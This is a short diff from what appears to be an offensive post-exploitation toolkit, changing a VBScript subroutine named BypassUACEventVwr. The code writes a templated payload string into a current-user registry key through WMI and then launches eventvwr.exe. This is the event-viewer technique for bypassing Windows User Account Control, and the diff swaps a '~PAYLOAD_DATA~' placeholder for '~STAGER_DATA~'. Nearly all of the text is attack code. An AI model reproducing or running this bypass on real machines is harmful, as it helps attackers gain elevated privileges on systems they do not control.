@@ -23,7 +23,7 @@ sub BypassUACEventVwr
     Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
     objRegistry.CreateKey HKEY_CURRENT_USER, strKeyPath
 
-    objRegistry.SetStringValue HKEY_CURRENT_USER, strKeyPath, "", "~PAYLOAD_DATA~"
+    objRegistry.SetStringValue HKEY_CURRENT_USER, strKeyPath, "", "~STAGER_DATA~"
 
     KoRunCmd "eventvwr.exe", true
     KoSleep 10
